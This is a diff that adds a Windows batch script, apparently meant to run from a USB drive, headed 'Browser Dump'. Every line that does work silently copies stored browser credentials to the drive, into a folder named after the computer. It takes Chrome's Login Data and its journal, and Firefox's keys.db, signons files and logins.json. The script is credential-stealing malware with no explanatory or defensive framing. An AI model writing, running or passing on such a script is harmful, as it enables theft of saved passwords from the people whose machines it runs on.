@@ -1,0 +1,23 @@
+@echo off 
+:: variables 
+SET odrive=%odrive:~0,2% 
+set backupcmd=xcopy /s /c /d /h /i /r /y /q
+echo off 
+
+echo.
+echo Browser Dump
+echo A
+echo D | %backupcmd% "%USERPROFILE%\Appdata\Local\Google\Chrome\User Data\Default\Login Data" "%drive%\all\%computername%\Browser Dump\chrome"
+echo B
+%backupcmd% "%USERPROFILE%\Appdata\Local\Google\Chrome\User Data\Default\Login Data-journal" "%drive%\all\%computername%\Browser Dump\chrome"
+echo C
+
+%backupcmd% "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*\keys.db" "%drive%\all\%computername%\Browser Dump\firefox"
+%backupcmd% "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*\signons.txt" "%drive%\all\%computername%\Browser Dump\firefox"
+%backupcmd% "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*\signons2.txt" "%drive%\all\%computername%\Browser Dump\firefox"
+%backupcmd% "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*\signons3.txt" "%drive%\all\%computername%\Browser Dump\firefox"
+%backupcmd% "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json" "%drive%\all\%computername%\Browser Dump\firefox"
+
+
+
+@echo off 
